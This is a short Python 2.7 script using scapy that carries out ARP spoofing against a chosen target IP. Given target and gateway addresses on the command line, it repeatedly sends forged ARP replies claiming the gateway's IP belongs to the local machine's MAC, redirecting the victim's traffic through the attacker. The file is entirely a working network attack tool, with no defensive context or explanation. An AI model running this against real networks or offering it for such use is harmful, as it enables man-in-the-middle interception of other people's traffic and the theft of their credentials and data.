#!/usr/bin/python2.7
# -*- coding=utf-8 -*-
from scapy.all import *
import getopt,Tools,threading,time,sys

def poison(localeIP,targetIP,gateIP):
		srploop(Ether()/ARP(op=2,hwsrc=Tools.get_MAC(),psrc=gateIP,hwdst=Tools.IP_to_MAC(targetIP),pdst=targetIP))

if __name__=='__main__':
	localeIP=None
	targetIP=None
	gateIP=None
	try:
		opts,argvs=getopt.getopt(sys.argv[1:],"l:t:g:","[help]")
	except:
		print("argvs error!")
	for o,v in opts:
		if o=='-l':
			localeIP=v
		if o=='-t':
			targetIP=v
		if o=='-g':
			gateIP=v
	poison(localeIP,targetIP,gateIP)
